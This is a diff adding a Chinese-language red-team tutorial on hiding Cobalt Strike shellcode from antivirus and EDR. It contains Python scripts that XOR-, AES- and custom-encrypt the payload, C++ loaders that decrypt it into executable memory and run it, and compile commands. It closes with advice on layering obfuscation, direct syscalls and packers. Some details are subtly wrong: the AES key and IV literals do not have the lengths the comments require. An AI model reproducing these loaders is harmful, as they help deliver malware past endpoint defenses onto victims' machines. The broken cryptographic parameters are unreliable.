@@ -1,0 +1,336 @@
+## 1. 概述 (Overview)
+
+在高级持续性威胁 (APT) 与红队攻防场景中，命令与控制 (C2) 框架生成的 Shellcode 是植入目标、建立持久化通信的关键载荷。然而，主流 C2 工具（如 Cobalt Strike, Metasploit 等）生成的默认 Shellcode 特征早已被各大安全厂商标记并监控，导致其在实战中极易被杀毒软件 (AV)、终端检测与响应 (EDR) 系统及网络入侵检测系统 (IDS) 拦截。
+
+本笔记的核心目标是深入探讨 Shellcode 的混淆与加密技术，旨在**打破静态特征码匹配、规避动态行为分析、隐藏真实执行逻辑**，从而提升 Shellcode 在复杂环境下的生存能力。我们将从基础的 XOR 混淆，到工业级的对称加密，再到灵活的自定义算法，结合理论与实践，逐步构建一个完整的免杀对抗知识体系。
+
+> **核心思想**：不让安全产品轻易识别出 Shellcode 的原始特征。如果对抗云沙箱或流量监控系统，还需对 C2 工具本身的通信协议、元数据等特征进行修改，以绕过基于情报 IOC 的检测。
+
+## 2. 技术原理 (Technical Principles)
+
+Shellcode 免杀的本质是一场“猫鼠游戏”，其技术原理主要围绕以下几点展开：
+
+*   **静态特征混淆 (Static Obfuscation)**:
+    *   **目的**: 破坏 Shellcode 文件在磁盘上的二进制特征，使其无法通过哈希或特征码（YARA 规则等）进行匹配。
+    *   **方法**: 对原始 Shellcode 字节流进行编码（如 Base64）、按位运算（如 XOR）或使用加密算法（如 AES）进行处理。加载器 (Loader) 在运行时负责解码/解密，还原出原始 Shellcode 并执行。
+
+*   **动态行为规避 (Dynamic Evasion)**:
+    *   **目的**: 规避在内存中执行时被动态分析工具（沙箱、内存扫描器）捕获。
+    *   **方法**:
+        *   **API 调用混淆**: 避免直接调用敏感的 Windows API（如 `VirtualAlloc`, `CreateThread`），转而使用间接调用、系统调用 (Syscall) 或其他未文档化的技术。
+        *   **分段解密**: 将 Shellcode 分割成多个加密块，在执行到特定阶段时才解密下一部分，增加动态分析的难度。
+        *   **反沙箱/反调试**: 在执行前检测自身是否处于分析环境中，如果是则终止执行。
+
+*   **对称加密保护 (Symmetric Encryption)**:
+    *   **原理**: 使用一个密钥 (Key) 对 Shellcode 进行加密，只有持有相同密钥的加载器才能解密。相比简单的 XOR，AES、DES 等标准加密算法提供了更高的安全强度和抗分析能力。
+    *   **优势**:
+        *   **密钥依赖**: 没有正确的密钥，攻击载荷无法被还原，静态分析几乎无效。
+        *   **雪崩效应**: 原始数据微小的改变会导致加密后数据发生巨大变化，有效隐藏了原始特征。
+
+## 3. 环境准备 (Environment Setup)
+
+进行 Shellcode 免杀测试需要一个隔离的实验环境。
+
+*   **攻击机 (Attacker)**:
+    *   操作系统: Kali Linux / Windows
+    *   C2 框架: Cobalt Strike (CS), Metasploit, VShell, Adaptix 等
+    *   编程环境: Python 3, C/C++, Go, Nim 等，用于编写加载器和混淆脚本。
+
+*   **靶机 (Victim)**:
+    *   操作系统: Windows 10 / Windows Server 2019
+    *   安全软件: Windows Defender (开启实时保护), 及其他主流 AV/EDR 产品（如卡巴斯基、火绒等）。
+    *   编译环境: Visual Studio 或 MinGW-w64，用于编译 C/C++ 加载器。
+
+*   **必备工具**:
+    *   **CyberChef**: 用于快速进行各种编码/解码和加密/解密操作。
+    *   **HxD**: 十六进制编辑器，用于查看和分析二进制文件。
+    *   **x64dbg**: Windows 平台下的开源调试器，用于动态分析加载器行为。
+
+## 4. 实战示例 (Hands-on Examples)
+
+以下示例将使用 Cobalt Strike 生成的 Stageless Shellcode (x64) 作为原始载荷进行演示。
+
+### 示例 1: XOR 异或运算混淆
+
+XOR 是最简单、最快速的混淆方法。其原理是 `A XOR B = C`，则 `C XOR B = A`。我们将用一个固定的密钥对 Shellcode 的每个字节进行异或操作。
+
+**攻击流程**:
+1.  **生成原始 Shellcode**: 在 Cobalt Strike 中生成一个原始的 `payload.bin` 文件。
+2.  **编写 XOR 加密脚本 (Python)**:
+
+    ```python
+    # xor_encrypt.py
+    import sys
+
+    # 一个简单的单字节密钥
+    KEY = 0xFA
+
+    try:
+        with open("payload.bin", "rb") as f:
+            shellcode = f.read()
+    except FileNotFoundError:
+        print("[-] payload.bin not found. Please generate it first.")
+        sys.exit(1)
+
+    # 对每个字节进行 XOR 操作
+    encrypted_shellcode = bytearray()
+    for byte in shellcode:
+        encrypted_shellcode.append(byte ^ KEY)
+
+    # 以 C 语言数组格式输出
+    # 例如: { 0x11, 0x22, 0x33, ... }
+    hex_output = "{"
+    for i, byte in enumerate(encrypted_shellcode):
+        if i % 16 == 0 and i != 0:
+            hex_output += "\n"
+        hex_output += f"0x{byte:02x}, "
+    hex_output = hex_output.rstrip(", ") + "}"
+
+    print(f"// Encrypted Shellcode (XOR with key 0x{KEY:02x})")
+    print(f"// Original size: {len(shellcode)} bytes")
+    print(f"// Encrypted size: {len(encrypted_shellcode)} bytes")
+    print(f"unsigned char buf[] = \n{hex_output};")
+
+    ```
+3.  **编写 C++ 加载器**:
+
+    ```cpp
+    // loader.cpp
+    #include <windows.h>
+    #include <iostream>
+
+    // 将上面 Python 脚本生成的加密 Shellcode 数组粘贴到这里
+    // 示例:
+    // unsigned char buf[] = 
+    // {0x1b, 0x3c, 0x4d, ...};
+    unsigned char buf[] = 
+    {
+        // --- PASTE ENCRYPTED SHELLCODE HERE ---
+    };
+
+
+    // 与加密脚本中相同的密钥
+    const BYTE KEY = 0xFA;
+
+    void XOR_Decrypt(unsigned char* data, size_t data_len, BYTE key) {
+        for (size_t i = 0; i < data_len; i++) {
+            data[i] = data[i] ^ key;
+        }
+    }
+
+    int main() {
+        // 隐藏控制台窗口
+        // FreeConsole();
+
+        // 1. 为 Shellcode 分配可读、可写、可执行的内存空间
+        void* exec_mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (exec_mem == NULL) {
+            return 1;
+        }
+
+        // 2. 解密 Shellcode
+        XOR_Decrypt(buf, sizeof(buf), KEY);
+
+        // 3. 将解密后的 Shellcode 复制到分配的内存中
+        RtlMoveMemory(exec_mem, buf, sizeof(buf));
+
+        // 4. 创建一个新线程来执行 Shellcode
+        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+        if (hThread == NULL) {
+            VirtualFree(exec_mem, 0, MEM_RELEASE);
+            return 1;
+        }
+
+        // 5. 等待线程执行完毕
+        WaitForSingleObject(hThread, INFINITE);
+
+        // 6. 释放内存
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+
+        return 0;
+    }
+    ```
+4.  **编译与执行**:
+    ```bash
+    # 使用 MinGW-w64 编译
+    x86_64-w64-mingw32-g++ loader.cpp -o loader.exe -s -lws2_32 -Wno-write-strings
+    ```
+    将 `loader.exe` 放到靶机上执行，即可绕过基础的静态特征检测并成功上线 C2。
+
+### 示例 2: AES/DES 加密混淆
+
+使用 AES 这种更强大的加密算法可以显著提高分析门槛。这里以 AES-256-CBC 为例。
+
+**攻击流程**:
+1.  **安装依赖**: `pip install pycryptodome`
+2.  **编写 AES 加密脚本 (Python)**:
+
+    ```python
+    # aes_encrypt.py
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+    import os
+
+    # 必须是 16, 24 或 32 字节长
+    KEY = b'ThisIsA_32_Byte_Secret_Key_!!!!' 
+    # 必须是 16 字节长
+    IV = b'ThisIsA_16_Byte_IV_!!!!'
+
+    with open("payload.bin", "rb") as f:
+        shellcode = f.read()
+
+    # 使用 CBC 模式创建 AES 加密器
+    cipher = AES.new(KEY, AES.MODE_CBC, IV)
+
+    # 对 Shellcode 进行 PKCS7 填充并加密
+    encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))
+
+    # 格式化输出
+    def format_to_c_array(data, var_name):
+        hex_output = "{"
+        for i, byte in enumerate(data):
+            if i % 16 == 0 and i != 0:
+                hex_output += "\n"
+            hex_output += f"0x{byte:02x}, "
+        hex_output = hex_output.rstrip(", ") + "}"
+        return f"unsigned char {var_name}[] = \n{hex_output};"
+
+    print(f"// AES-256-CBC Encrypted Shellcode")
+    print(f"// Original size: {len(shellcode)} bytes")
+    print(f"// Encrypted size: {len(encrypted_shellcode)} bytes\n")
+    print(format_to_c_array(KEY, "key"))
+    print(format_to_c_array(IV, "iv"))
+    print(format_to_c_array(encrypted_shellcode, "buf"))
+    ```
+3.  **编写 C++ 加载器 (需集成 AES 解密库)**:
+    为了简化，这里使用一个常见的、小型的开源 C 语言 AES 库（如 `tiny-aes-c`）。你需要将 `aes.h` 和 `aes.c` 文件与 `loader.cpp` 放在同一目录。
+
+    ```cpp
+    // loader_aes.cpp
+    #include <windows.h>
+    #include "aes.h" // 引入 tiny-aes-c 库
+
+    // --- 将 Python 脚本生成的 key, iv, buf 数组粘贴到这里 ---
+    unsigned char key[] = { ... };
+    unsigned char iv[] = { ... };
+    unsigned char buf[] = { ... };
+
+    int main() {
+        // FreeConsole();
+
+        struct AES_ctx ctx;
+        AES_init_ctx_iv(&ctx, key, iv);
+        
+        // 2. 在原地解密 Shellcode (CBC 模式)
+        AES_CBC_decrypt_buffer(&ctx, buf, sizeof(buf));
+
+        // PKCS7 unpadding - 找到填充的长度并调整 Shellcode 大小
+        // 注意：tiny-aes-c 不自带 unpadding，需要手动实现
+        int padding_len = buf[sizeof(buf) - 1];
+        size_t shellcode_size = sizeof(buf) - padding_len;
+
+        // 1. 分配内存
+        void* exec_mem = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (exec_mem == NULL) return 1;
+
+        // 3. 复制解密后的 Shellcode
+        RtlMoveMemory(exec_mem, buf, shellcode_size);
+
+        // 4. 执行
+        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+        WaitForSingleObject(hThread, INFINITE);
+
+        // 6. 清理
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+
+        return 0;
+    }
+    ```
+4.  **编译与执行**:
+    ```bash
+    # 编译时需要链接 aes.c
+    x86_64-w64-mingw32-g++ loader_aes.cpp aes.c -o loader_aes.exe -s -lws2_32 -Wno-write-strings
+    ```
+
+### 示例 3: 自定义算法混淆
+
+自定义算法的优势在于其“独一无二”，无法被基于已知算法的自动化工具分析。我们可以结合多种简单操作来构建一个独特的混淆层。
+
+**算法设计**:
+1.  生成一个随机的单字节密钥 `KEY`。
+2.  对原始 Shellcode 的每个字节 `B`，执行 `(B + i) XOR KEY`，其中 `i` 是字节的索引。这引入了位置相关的变化。
+
+**攻击流程**:
+1.  **编写自定义加密脚本 (Python)**:
+
+    ```python
+    # custom_encrypt.py
+    import random
+
+    KEY = random.randint(1, 255) # 动态生成密钥
+
+    with open("payload.bin", "rb") as f:
+        shellcode = f.read()
+
+    encrypted_shellcode = bytearray()
+    for i, byte in enumerate(shellcode):
+        # 算法: (byte + index) XOR key
+        # 使用 (byte + i) & 0xFF 确保结果在 0-255 范围内
+        encrypted_byte = ((byte + i) & 0xFF) ^ KEY
+        encrypted_shellcode.append(encrypted_byte)
+
+    # ... (后续格式化输出代码与 XOR 示例相同) ...
+    print(f"// Custom Encrypted Shellcode (KEY: 0x{KEY:02x})")
+    # ...
+    ```
+2.  **编写 C++ 加载器**:
+
+    ```cpp
+    // loader_custom.cpp
+    #include <windows.h>
+
+    // --- 粘贴加密后的 Shellcode 和 KEY ---
+    unsigned char buf[] = { ... };
+    const BYTE KEY = 0x...; // 使用脚本生成的那个 KEY
+
+    void Custom_Decrypt(unsigned char* data, size_t data_len, BYTE key) {
+        for (size_t i = 0; i < data_len; i++) {
+            // 必须执行与加密相反的操作
+            // C = ((B + i) & 0xFF) ^ K
+            // B = ((C ^ K) - i) & 0xFF
+            unsigned char temp = data[i] ^ key;
+            data[i] = (temp - i) & 0xFF; // & 0xFF 处理负数回绕
+        }
+    }
+
+    int main() {
+        // ... (加载器逻辑与 XOR 示例完全相同, 仅替换解密函数)
+        Custom_Decrypt(buf, sizeof(buf), KEY);
+        // ...
+        return 0;
+    }
+    ```
+
+## 5. 关键细节 (Key Details)
+
+*   **密钥管理**: 硬编码在加载器中的密钥是静态分析的薄弱点。更高级的技术会将密钥从远程服务器获取、通过特定算法在运行时动态生成，或者隐藏在文件的其他位置（如资源节、PE 头）。
+*   **API 调用**: 示例中使用的 `VirtualAlloc`, `CreateThread` 等是高度敏感的 API，极易被 EDR 监控。在后续进阶学习中，需要掌握使用 **Hell's Gate / Halo's Gate (直接系统调用)**、**API Hashing (动态解析 API 地址)** 等技术来隐藏这些调用行为。
+*   **加载器本身**: 加载器编译后的 `exe` 文件本身也可能带有编译器指纹或被启发式引擎标记。可以采用不同的编译器 (Clang, MSVC)、不同的语言 (Go, Nim, Rust)，或对编译后的文件进行加壳 (Packer) 来进一步规避检测。
+*   **分段解密**: 对于大型 Shellcode，可以将其分割成多个块。加载器先解密并执行第一块（通常是另一个小型解密存根），这个存根再负责解密并执行下一块，以此类推。这使得分析师无法一次性从内存中 dump 出完整的 Shellcode。
+
+## 6. 安全总结 (Security Summary)
+
+| 技术类型 | 优点 | 缺点 | 适用场景 |
+| :--- | :--- | :--- | :--- |
+| **XOR 混淆** | 实现简单，速度极快，资源消耗低。 | 算法固定，易被自动化工具爆破或模式识别。 | 快速绕过基础的、基于静态签名的 AV。 |
+| **AES/DES 加密** | 加密强度高，抗静态分析能力强，无密钥无法解密。 | 算法标准，实现可能被识别为“加密行为”；需要集成库，增加体积。 | 对抗具备深度静态文件分析能力的 AV/EDR。 |
+| **自定义算法** | 算法未知，无法被通用工具自动化分析，极具隐蔽性。 | 算法设计需要技巧，若过于简单则等同于 XOR；逆向难度取决于算法复杂度。 | 对抗高级分析环境、云沙箱，或作为多层混淆中的一层。 |
+
+**最终结论**:
+单一的混淆或加密技术在当今的攻防环境下已略显不足。一个成功的免杀方案通常是**多种技术的组合**：
+
+> **推荐策略**: **自定义混淆算法 + AES 加密 + API 调用混淆**
+
+例如，先对 Shellcode 进行 AES 加密，然后对加密后的数据再进行一次自定义的、位置相关的 XOR 混淆。加载器在运行时首先进行反向的自定义解混淆，然后再执行 AES 解密，最后通过直接系统调用来执行 Shellcode。这种分层、独特的处理方式能够最大限度地提升对抗效果。
+
+未来的学习方向应聚焦于**内存行为的规避**，因为这正是 EDR 等现代安全产品的核心监控领域。
